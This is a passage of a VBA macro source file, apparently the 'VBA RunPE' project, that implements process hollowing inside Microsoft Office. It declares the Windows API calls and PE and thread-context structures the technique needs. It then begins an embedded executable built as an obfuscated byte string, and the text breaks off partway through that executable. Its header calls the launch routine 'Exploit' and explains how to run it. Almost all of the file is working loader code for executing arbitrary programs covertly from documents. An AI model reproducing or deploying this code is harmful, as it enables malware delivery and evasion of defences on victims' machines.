' --------------------------------------------------------------------------------
' Title: VBA RunPE
' Filename: RunPE.vba
' GitHub: https://github.com/itm4n/VBA-RunPE
' Date: 2019-12-14
' Author: Clement Labro (@itm4n)
' Description: A RunPE implementation in VBA with Windows API calls. It is
'   compatible with both 32 bits and 64 bits versions of Microsoft Office.
'   The 32 bits version of Office can only run 32 bits executables and the 64 bits
'   version can only run 64 bits executables.
' Usage: 1. In the 'Exploit' procedure at the end of the code, set the path of the
'               file you want to execute (with optional arguments)
'        2. Enable View > Immediate Window (Ctrl + G) (to check execution and error
'               logs)
'        3. Run the macro!
' Tested on: - Windows 7 Pro 64 bits + Office 2016 32 bits
'            - Windows 10 Pro 64 bits + Office 2016 64 bits
' Credit: @hasherezade - https://github.com/hasherezade/ (RunPE written in C++
'   with dynamic relocations)
' --------------------------------------------------------------------------------

Option Explicit

' ================================================================================
'                      ~~~ IMPORT WINDOWS API FUNCTIONS ~~~
' ================================================================================
#If Win64 Then
    Private Declare PtrSafe Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByVal sSource As LongPtr, ByVal lLength As Long)
    Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, ByVal lpContext As LongPtr) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
#Else
    Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As Long, ByVal lLength As Long)
    Private Declare Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFilename As String, ByVal nSize As Long) As Long
    Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
    Private Declare Function GetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
    Private Declare Function SetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As Long) As Long
    Private Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Integer) As Long
#End If


' ================================================================================
'                           ~~~ WINDOWS STRUCTURES ~~~
' ================================================================================
' Constants used in structure definitions
Private Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
Private Const IMAGE_SIZEOF_SHORT_NAME = 8
Private Const MAXIMUM_SUPPORTED_EXTENSION = 512
Private Const SIZE_OF_80387_REGISTERS = 80

#If Win64 Then
    Private Type M128A
        Low As LongLong     'ULONGLONG Low;
        High As LongLong    'LONGLONG High;
    End Type
#End If

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html
Private Type IMAGE_DOS_HEADER
     e_magic As Integer         'WORD e_magic;
     e_cblp As Integer          'WORD e_cblp;
     e_cp As Integer            'WORD e_cp;
     e_crlc As Integer          'WORD e_crlc;
     e_cparhdr As Integer       'WORD e_cparhdr;
     e_minalloc As Integer      'WORD e_minalloc;
     e_maxalloc As Integer      'WORD e_maxalloc;
     e_ss As Integer            'WORD e_ss;
     e_sp As Integer            'WORD e_sp;
     e_csum As Integer          'WORD e_csum;
     e_ip As Integer            'WORD e_ip;
     e_cs As Integer            'WORD e_cs;
     e_lfarlc As Integer        'WORD e_lfarlc;
     e_ovno As Integer          'WORD e_ovno;
     e_res(4 - 1) As Integer    'WORD e_res[4];
     e_oemid As Integer         'WORD e_oemid;
     e_oeminfo As Integer       'WORD e_oeminfo;
     e_res2(10 - 1) As Integer  'WORD e_res2[10];
     e_lfanew As Long           'LONG e_lfanew;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680305(v=vs.85).aspx
Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long      'DWORD   VirtualAddress;
    Size As Long                'DWORD   Size;
End Type

' undocumented
Private Type IMAGE_BASE_RELOCATION
    VirtualAddress As Long        'DWORD   VirtualAddress
    SizeOfBlock As Long           'DWORD   SizeOfBlock
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680313(v=vs.85).aspx
Private Type IMAGE_FILE_HEADER
    Machine As Integer                  'WORD    Machine;
    NumberOfSections As Integer         'WORD    NumberOfSections;
    TimeDateStamp As Long               'DWORD   TimeDateStamp;
    PointerToSymbolTable As Long        'DWORD   PointerToSymbolTable;
    NumberOfSymbols As Long             'DWORD   NumberOfSymbols;
    SizeOfOptionalHeader As Integer     'WORD    SizeOfOptionalHeader;
    Characteristics As Integer          'WORD    Characteristics;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms680339(v=vs.85).aspx
Private Type IMAGE_OPTIONAL_HEADER
    #If Win64 Then
        Magic As Integer                        'WORD        Magic;
        MajorLinkerVersion As Byte              'BYTE        MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE        MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD       SizeOfCode;
        SizeOfInitializedData As Long           'DWORD       SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD       SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD       AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD       BaseOfCode;
        ImageBase As LongLong                   'ULONGLONG   ImageBase;
        SectionAlignment As Long                'DWORD       SectionAlignment;
        FileAlignment As Long                   'DWORD       FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD        MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD        MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD        MajorImageVersion;
        MinorImageVersion As Integer            'WORD        MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD        MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD        MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD       Win32VersionValue;
        SizeOfImage As Long                     'DWORD       SizeOfImage;
        SizeOfHeaders As Long                   'DWORD       SizeOfHeaders;
        CheckSum As Long                        'DWORD       CheckSum;
        Subsystem As Integer                    'WORD        Subsystem;
        DllCharacteristics As Integer           'WORD        DllCharacteristics;
        SizeOfStackReserve As LongLong          'ULONGLONG   SizeOfStackReserve;
        SizeOfStackCommit As LongLong           'ULONGLONG   SizeOfStackCommit;
        SizeOfHeapReserve As LongLong           'ULONGLONG   SizeOfHeapReserve;
        SizeOfHeapCommit As LongLong            'ULONGLONG   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD       LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD       NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #Else
        Magic As Integer                        'WORD    Magic;
        MajorLinkerVersion As Byte              'BYTE    MajorLinkerVersion;
        MinorLinkerVersion As Byte              'BYTE    MinorLinkerVersion;
        SizeOfCode As Long                      'DWORD   SizeOfCode;
        SizeOfInitializedData As Long           'DWORD   SizeOfInitializedData;
        SizeOfUninitializedData As Long         'DWORD   SizeOfUninitializedData;
        AddressOfEntryPoint As Long             'DWORD   AddressOfEntryPoint;
        BaseOfCode As Long                      'DWORD   BaseOfCode;
        BaseOfData As Long                      'DWORD   BaseOfData;
        ImageBase As Long                       'DWORD   ImageBase;
        SectionAlignment As Long                'DWORD   SectionAlignment;
        FileAlignment As Long                   'DWORD   FileAlignment;
        MajorOperatingSystemVersion As Integer  'WORD    MajorOperatingSystemVersion;
        MinorOperatingSystemVersion As Integer  'WORD    MinorOperatingSystemVersion;
        MajorImageVersion As Integer            'WORD    MajorImageVersion;
        MinorImageVersion As Integer            'WORD    MinorImageVersion;
        MajorSubsystemVersion As Integer        'WORD    MajorSubsystemVersion;
        MinorSubsystemVersion As Integer        'WORD    MinorSubsystemVersion;
        Win32VersionValue As Long               'DWORD   Win32VersionValue;
        SizeOfImage As Long                     'DWORD   SizeOfImage;
        SizeOfHeaders As Long                   'DWORD   SizeOfHeaders;
        CheckSum As Long                        'DWORD   CheckSum;
        Subsystem As Integer                    'WORD    Subsystem;
        DllCharacteristics As Integer           'WORD    DllCharacteristics;
        SizeOfStackReserve As Long              'DWORD   SizeOfStackReserve;
        SizeOfStackCommit As Long               'DWORD   SizeOfStackCommit;
        SizeOfHeapReserve As Long               'DWORD   SizeOfHeapReserve;
        SizeOfHeapCommit As Long                'DWORD   SizeOfHeapCommit;
        LoaderFlags As Long                     'DWORD   LoaderFlags;
        NumberOfRvaAndSizes As Long             'DWORD   NumberOfRvaAndSizes;
        DataDirectory(IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY 'IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
    #End If
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680336(v=vs.85).aspx
Private Type IMAGE_NT_HEADERS
    Signature As Long                         'DWORD Signature;
    FileHeader As IMAGE_FILE_HEADER           'IMAGE_FILE_HEADER FileHeader;
    OptionalHeader As IMAGE_OPTIONAL_HEADER   'IMAGE_OPTIONAL_HEADER OptionalHeader;
End Type

' https://www.nirsoft.net/kernel_struct/vista/IMAGE_SECTION_HEADER.html
Private Type IMAGE_SECTION_HEADER
    SecName(IMAGE_SIZEOF_SHORT_NAME - 1) As Byte 'UCHAR Name[IMAGE_SIZEOF_SHORT_NAME];
    Misc As Long                    'ULONG Misc;
    VirtualAddress As Long          'ULONG VirtualAddress;
    SizeOfRawData As Long           'ULONG SizeOfRawData;
    PointerToRawData As Long        'ULONG PointerToRawData;
    PointerToRelocations As Long    'ULONG PointerToRelocations;
    PointerToLinenumbers As Long    'ULONG PointerToLinenumbers;
    NumberOfRelocations As Integer  'WORD  NumberOfRelocations;
    NumberOfLinenumbers As Integer  'WORD  NumberOfLinenumbers;
    Characteristics As Long         'ULONG Characteristics;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms684873(v=vs.85).aspx
Private Type PROCESS_INFORMATION
    hProcess As LongPtr     'HANDLE hProcess;
    hThread As LongPtr      'HANDLE hThread;
    dwProcessId As Long     'DWORD  dwProcessId;
    dwThreadId As Long      'DWORD  dwThreadId;
End Type

' https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
Private Type STARTUPINFO
    cb As Long                  'DWORD  cb;
    lpReserved As String        'LPSTR  lpReserved;
    lpDesktop As String         'LPSTR  lpDesktop;
    lpTitle As String           'LPSTR  lpTitle;
    dwX As Long                 'DWORD  dwX;
    dwY As Long                 'DWORD  dwY;
    dwXSize As Long             'DWORD  dwXSize;
    dwYSize As Long             'DWORD  dwYSize;
    dwXCountChars As Long       'DWORD  dwXCountChars;
    dwYCountChars As Long       'DWORD  dwYCountChars;
    dwFillAttribute As Long     'DWORD  dwFillAttribute;
    dwFlags As Long             'DWORD  dwFlags;
    wShowWindow As Integer      'WORD   wShowWindow;
    cbReserved2 As Integer      'WORD   cbReserved2;
    lpReserved2 As LongPtr      'LPBYTE lpReserved2;
    hStdInput As LongPtr        'HANDLE hStdInput;
    hStdOutput As LongPtr       'HANDLE hStdOutput;
    hStdError As LongPtr        'HANDLE hStdError;
End Type

' https://www.nirsoft.net/kernel_struct/vista/FLOATING_SAVE_AREA.html
Private Type FLOATING_SAVE_AREA
    ControlWord As Long                                 'DWORD ControlWord;
    StatusWord As Long                                  'DWORD StatusWord;
    TagWord As Long                                     'DWORD TagWord;
    ErrorOffset As Long                                 'DWORD ErrorOffset;
    ErrorSelector As Long                               'DWORD ErrorSelector;
    DataOffset As Long                                  'DWORD DataOffset;
    DataSelector As Long                                'DWORD DataSelector;
    RegisterArea(SIZE_OF_80387_REGISTERS - 1) As Byte   'BYTE  RegisterArea[SIZE_OF_80387_REGISTERS];
    Spare0 As Long                                      'DWORD Spare0;
End Type

' winnt.h
#If Win64 Then
    Private Type XMM_SAVE_AREA32
        ControlWord As Integer                  'WORD  ControlWord;
        StatusWord As Integer                   'WORD  StatusWord;
        TagWord As Byte                         'BYTE  TagWord;
        Reserved1 As Byte                       'BYTE  Reserved1;
        ErrorOpcode As Integer                  'WORD  ErrorOpcode;
        ErrorOffset As Long                     'DWORD ErrorOffset;
        ErrorSelector As Integer                'WORD  ErrorSelector;
        Reserved2 As Integer                    'WORD  Reserved2;
        DataOffset As Long                      'DWORD DataOffset;
        DataSelector As Integer                 'WORD  DataSelector;
        Reserved3 As Integer                    'WORD  Reserved3;
        MxCsr As Long                           'DWORD MxCsr;
        MxCsr_Mask As Long                      'DWORD MxCsr_Mask;
        FloatRegisters(8 - 1) As M128A          'M128A FloatRegisters[8];
        XmmRegisters(16 - 1) As M128A       'M128A XmmRegisters[16];
        Reserved4(96 - 1) As Byte           'BYTE  Reserved4[96];
End Type
#End If

Private Type CONTEXT
    #If Win64 Then
        ' Register parameter home addresses
        P1Home As LongLong                  'DWORD64 P1Home;
        P2Home As LongLong                  'DWORD64 P2Home;
        P3Home As LongLong                  'DWORD64 P3Home;
        P4Home As LongLong                  'DWORD64 P4Home;
        P5Home As LongLong                  'DWORD64 P5Home;
        P6Home As LongLong                  'DWORD64 P6Home;
        ' Control flags
        ContextFlags As Long                'DWORD ContextFlags;
        MxCsr As Long                       'DWORD MxCsr;
        ' Segment Registers and processor flags
        SegCs As Integer                    'WORD   SegCs;
        SegDs As Integer                    'WORD   SegDs;
        SegEs As Integer                    'WORD   SegEs;
        SegFs As Integer                    'WORD   SegFs;
        SegGs As Integer                    'WORD   SegGs;
        SegSs As Integer                    'WORD   SegSs;
        EFlags As Long                      'DWORD  EFlags;
        ' Debug registers
        Dr0 As LongLong                     'DWORD64 Dr0;
        Dr1 As LongLong                     'DWORD64 Dr1;
        Dr2 As LongLong                     'DWORD64 Dr2;
        Dr3 As LongLong                     'DWORD64 Dr3;
        Dr6 As LongLong                     'DWORD64 Dr6;
        Dr7 As LongLong                     'DWORD64 Dr7;
        ' Integer registers
        Rax As LongLong                     'DWORD64 Rax;
        Rcx As LongLong                     'DWORD64 Rcx;
        Rdx As LongLong                     'DWORD64 Rdx;
        Rbx As LongLong                     'DWORD64 Rbx;
        Rsp As LongLong                     'DWORD64 Rsp;
        Rbp As LongLong                     'DWORD64 Rbp;
        Rsi As LongLong                     'DWORD64 Rsi;
        Rdi As LongLong                     'DWORD64 Rdi;
        R8 As LongLong                      'DWORD64 R8;
        R9 As LongLong                      'DWORD64 R9;
        R10 As LongLong                     'DWORD64 R10;
        R11 As LongLong                     'DWORD64 R11;
        R12 As LongLong                     'DWORD64 R12;
        R13 As LongLong                     'DWORD64 R13;
        R14 As LongLong                     'DWORD64 R14;
        R15 As LongLong                     'DWORD64 R15;
        ' Program counter
        Rip As LongLong                     'DWORD64 Rip
        ' Floating point state
        FltSave As XMM_SAVE_AREA32          'XMM_SAVE_AREA32 FltSave;
        'Header(2 - 1) As M128A              'M128A Header[2];
        'Legacy(8 - 1) As M128A              'M128A Legacy[8];
        'Xmm0 As M128A                       'M128A Xmm0;
        'Xmm1 As M128A                       'M128A Xmm1;
        'Xmm2 As M128A                       'M128A Xmm2;
        'Xmm3 As M128A                       'M128A Xmm3;
        'Xmm4 As M128A                       'M128A Xmm4;
        'Xmm5 As M128A                       'M128A Xmm5;
        'Xmm6 As M128A                       'M128A Xmm6;
        'Xmm7 As M128A                       'M128A Xmm7;
        'Xmm8 As M128A                       'M128A Xmm8;
        'Xmm9 As M128A                       'M128A Xmm9;
        'Xmm10 As M128A                      'M128A Xmm10;
        'Xmm11 As M128A                      'M128A Xmm11;
        'Xmm12 As M128A                      'M128A Xmm12;
        'Xmm13 As M128A                      'M128A Xmm13;
        'Xmm14 As M128A                      'M128A Xmm14;
        'Xmm15 As M128A                      'M128A Xmm15;
        ' Vector registers
        VectorRegister(26 - 1) As M128A     'M128A   VectorRegister[26];
        VectorControl As LongLong           'DWORD64 VectorControl;
        ' Special debug control registers
        DebugControl As LongLong            'DWORD64 DebugControl;
        LastBranchToRip As LongLong         'DWORD64 LastBranchToRip;
        LastBranchFromRip As LongLong       'DWORD64 LastBranchFromRip;
        LastExceptionToRip As LongLong      'DWORD64 LastExceptionToRip;
        LastExceptionFromRip As LongLong    'DWORD64 LastExceptionFromRip;
    #Else
        ' https://msdn.microsoft.com/en-us/library/windows/desktop/ms679284(v=vs.85).aspx
        ContextFlags As Long                'DWORD ContextFlags;
        Dr0 As Long                         'DWORD Dr0;
        Dr1 As Long                         'DWORD Dr1;
        Dr2 As Long                         'DWORD Dr2;
        Dr3 As Long                         'DWORD Dr3;
        Dr6 As Long                         'DWORD Dr6;
        Dr7 As Long                         'DWORD Dr7;
        FloatSave As FLOATING_SAVE_AREA     'FLOATING_SAVE_AREA FloatSave;
        SegGs As Long                       'DWORD SegGs;
        SegFs As Long                       'DWORD SegFs;
        SegEs As Long                       'DWORD SegEs;
        SegDs As Long                       'DWORD SegDs;
        Edi As Long                         'DWORD Edi;
        Esi As Long                         'DWORD Esi;
        Ebx As Long                         'DWORD Ebx;
        Edx As Long                         'DWORD Edx;
        Ecx As Long                         'DWORD Ecx;
        Eax As Long                         'DWORD Eax;
        Ebp As Long                         'DWORD Ebp;
        Eip As Long                         'DWORD Eip;
        SegCs As Long                       'DWORD SegCs;  // MUST BE SANITIZED
        EFlags As Long                      'DWORD EFlags; // MUST BE SANITIZED
        Esp As Long                         'DWORD Esp;
        SegSs As Long                       'DWORD SegSs;
        ExtendedRegisters(MAXIMUM_SUPPORTED_EXTENSION - 1) As Byte 'BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];
    #End If
End Type


' ================================================================================
'                   ~~~ CONSTANTS USED IN WINDOWS API CALLS ~~~
' ================================================================================
Private Const MEM_COMMIT = &H1000
Private Const MEM_RESERVE = &H2000
Private Const PAGE_READWRITE = &H4
Private Const PAGE_EXECUTE_READWRITE = &H40
Private Const MAX_PATH = 260
Private Const CREATE_SUSPENDED = &H4

Private Const CONTEXT_AMD64 = &H100000
Private Const CONTEXT_I386 = &H10000
#If Win64 Then
    Private Const CONTEXT_ARCH = CONTEXT_AMD64
#Else
    Private Const CONTEXT_ARCH = CONTEXT_I386
#End If
Private Const CONTEXT_CONTROL = CONTEXT_ARCH Or &H1
Private Const CONTEXT_INTEGER = CONTEXT_ARCH Or &H2
Private Const CONTEXT_SEGMENTS = CONTEXT_ARCH Or &H4
Private Const CONTEXT_FLOATING_POINT = CONTEXT_ARCH Or &H8
Private Const CONTEXT_DEBUG_REGISTERS = CONTEXT_ARCH Or &H10
Private Const CONTEXT_EXTENDED_REGISTERS = CONTEXT_ARCH Or &H20
Private Const CONTEXT_FULL = CONTEXT_CONTROL Or CONTEXT_INTEGER Or CONTEXT_SEGMENTS


' ================================================================================
'                     ~~~ CONSTANTS USED IN THE MAIN SUB ~~~
' ================================================================================
Private Const VERBOSE = False                       ' Set to True for debugging
Private Const IMAGE_DOS_SIGNATURE = &H5A4D          ' 0x5A4D      // MZ
Private Const IMAGE_NT_SIGNATURE = &H4550           ' 0x00004550  // PE00
Private Const IMAGE_FILE_MACHINE_I386 = &H14C       ' 32 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664     ' 64 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
Private Const SIZEOF_IMAGE_DOS_HEADER = 64
Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
Private Const SIZEOF_IMAGE_FILE_HEADER = 20
Private Const SIZEOF_IMAGE_DATA_DIRECTORY = 8
Private Const SIZEOF_IMAGE_BASE_RELOCATION = 8
Private Const SIZEOF_IMAGE_BASE_RELOCATION_ENTRY = 2
#If Win64 Then
    Private Const SIZEOF_IMAGE_NT_HEADERS = 264
    Private Const SIZEOF_ADDRESS = 8
#Else
    Private Const SIZEOF_IMAGE_NT_HEADERS = 248
    Private Const SIZEOF_ADDRESS = 4
#End If

' Data Directories
' |__ IMAGE_OPTIONAL_HEADER contains an array of 16 IMAGE_DATA_DIRECTORY structures
' |__ Each IMAGE_DATA_DIRECTORY structure as a "predefined role", as defined by these constants (in winnt.h)
Private Const IMAGE_DIRECTORY_ENTRY_EXPORT = 0       ' Export Directory
Private Const IMAGE_DIRECTORY_ENTRY_IMPORT = 1       ' Import Directory
Private Const IMAGE_DIRECTORY_ENTRY_RESOURCE = 2     ' Resource Directory
Private Const IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3    ' Exception Directory
Private Const IMAGE_DIRECTORY_ENTRY_SECURITY = 4     ' Security Directory
Private Const IMAGE_DIRECTORY_ENTRY_BASERELOC = 5    ' Base Relocation Table
Private Const IMAGE_DIRECTORY_ENTRY_DEBUG = 6        ' Debug Directory
Private Const IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7    ' Description String
Private Const IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8    ' Machine Value (MIPS GP)
Private Const IMAGE_DIRECTORY_ENTRY_TLS = 9          ' TLS Directory
Private Const IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10 ' Load Configuration Directory


' ================================================================================
'                                ~~~ HELPERS ~~~
' ================================================================================

' --------------------------------------------------------------------------------
' Method:    ByteArrayLength
' Desc:      Returns the length of a Byte array
' Arguments: baBytes - An array of Bytes
' Returns:   The size of the array as a Long
' --------------------------------------------------------------------------------
Public Function ByteArrayLength(baBytes() As Byte) As Long
    On Error Resume Next
    ByteArrayLength = UBound(baBytes) - LBound(baBytes) + 1
End Function

' --------------------------------------------------------------------------------
' Method:    ByteArrayToString
' Desc:      Converts an array of Bytes to a String
' Arguments: baBytes - An array of Bytes
' Returns:   The String representation of the Byte array
' --------------------------------------------------------------------------------
Private Function ByteArrayToString(baBytes() As Byte) As String
    Dim strRes As String: strRes = ""
    Dim iCount As Integer
    For iCount = 0 To ByteArrayLength(baBytes) - 1
        If baBytes(iCount) <> 0 Then
            strRes = strRes & Chr(baBytes(iCount))
        Else
            Exit For
        End If
    Next iCount
    ByteArrayToString = strRes
End Function

' --------------------------------------------------------------------------------
' Method:    FileToByteArray
' Desc:      Reads a file as a Byte array
' Arguments: strFilename - Fullname of the file as a String (ex:
'                'C:\Windows\System32\cmd.exe')
' Returns:   The content of the file as a Byte array
' --------------------------------------------------------------------------------
Private Function FileToByteArray(strFilename As String) As Byte()
    ' File content to String
    Dim strFileContent As String
    Dim iFile As Integer: iFile = FreeFile
    Open strFilename For Binary Access Read As #iFile
        strFileContent = Space(FileLen(strFilename))
        Get #iFile, , strFileContent
    Close #iFile
    
    ' String to Byte array
    Dim baFileContent() As Byte
    baFileContent = StrConv(strFileContent, vbFromUnicode)

    FileToByteArray = baFileContent
End Function

' --------------------------------------------------------------------------------
' Method:    StringToByteArray
' Desc:      Convert a String to a Byte array
' Arguments: strContent - Input String representing the PE
' Returns:   The content of the String as a Byte array
' --------------------------------------------------------------------------------
Private Function StringToByteArray(strContent As String) As Byte()
    Dim baContent() As Byte
    baContent = StrConv(strContent, vbFromUnicode)
    StringToByteArray = baContent
End Function

' --------------------------------------------------------------------------------
' Method:    A
' Desc:      Append a Char to a String.
' Arguments: strA - Input String. E.g.: "AAA"
'            bChar - Input Char as a Byte. E.g.: 66 or &H42
' Returns:   The concatenation of the String and the Char. E.g.: "AAAB"
' --------------------------------------------------------------------------------
Private Function A(strA As String, bChar As Byte) As String
    A = strA & Chr(bChar)
End Function

' --------------------------------------------------------------------------------
' Method:    B
' Desc:      Append a String to another String.
' Arguments: strA - Input String 1. E.g.: "AAAA"
'            strB - Input String 2. E.g.: "BBBB"
' Returns:   The concatenation of the two Strings. E.g.: "AAAABBBB"
' --------------------------------------------------------------------------------
Private Function B(strA As String, strB As String) As String
    B = strA + strB
End Function


' ================================================================================
'                                ~~~ EMBEDDED PE ~~~
' ================================================================================

' CODE GENERATED BY PE2VBA
' ===== BEGIN PE2VBA =====
Private Function PE0() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "MZ"), 144), 0), 3), 0), 0), 0), 4), 0), 0), 0), 255), 255), 0), 0), 184), 0), 0), 0), 0), 0), 0), 0), "@"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 128), 0), 0), 0), 14), 31), 186), 14), 0), 180), 9), 205), "!"), 184), 1), "L"), 205), "!This program cannot be")
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(strPE, " run in DOS mode."), 13), 13), 10), "$"), 0), 0), 0), 0), 0), 0), 0), "PE"), 0), 0), "d"), 134), 10), 0), "U'"), 129), "`"), 0), 0), 0), 0), 0), 0), 0), 0), 240), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(strPE, "/"), 2), 11), 2), 2), "#"), 0), "r"), 0), 0), 0), 162), 0), 0), 0), 12), 0), 0), 224), 20), 0), 0), 0), 16), 0), 0), 0), 0), "@"), 0), 0), 0), 0), 0), 0), 16), 0), 0), 0), 2), 0), 0), 4), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 5), 0), 2), 0), 0), 0), 0), 0), 0), " "), 1), 0), 0), 4), 0), 0), 132), 133), 1), 0), 3), 0), 0), 0), 0), 0), " "), 0), 0), 0), 0), 0), 0), 16), 0), 0), 0), 0), 0), 0), 0), 0), 16), 0), 0), 0), 0), 0), 0), 16)
